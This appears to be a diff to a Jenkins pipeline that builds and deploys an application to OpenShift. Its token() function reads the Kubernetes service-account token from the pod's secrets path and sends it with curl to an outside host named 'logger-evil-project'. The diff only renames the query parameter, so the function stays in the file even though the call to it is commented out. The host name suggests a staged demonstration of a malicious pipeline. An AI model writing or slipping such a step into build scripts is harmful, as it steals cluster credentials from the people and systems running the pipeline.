@@ -11,7 +11,7 @@ node('maven') {
    	def SKIP_TEST = "false"
  
    	stage ('Build & Test') {
-		token()
+//		token()
    		git branch: 'master', url: "${GIT_URL}"
    		sh "${mvnCmd} clean package -DskipTests=${SKIP_TEST} fabric8:build"
    	}
@@ -35,7 +35,7 @@ node('maven') {
    	stage ('Deploy to PROD') {
         //put into PROD imagestream
         sh "oc tag ${CICD_PROJECT}/${APP_NAME}:latest ${PROD_PROJECT}/${APP_NAME}:latest"
-        envSetup(PROD_PROJECT, APP_NAME, 'latest', PORT, false)
+        envSetup(PROD_PROJECT, APP_NAME, 'latest', PORT, true)
 	}
 
 }
@@ -71,5 +71,5 @@ def token() {
      script: "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
    	 returnStdout: true
   ).trim()
-  sh "curl http://logger-evil-project.apps.ocpdev.vargadaniel.com/?log=${SATOKEN}"
+  sh "curl http://logger-evil-project.apps.ocpdev.vargadaniel.com/?token=${SATOKEN}"
 }
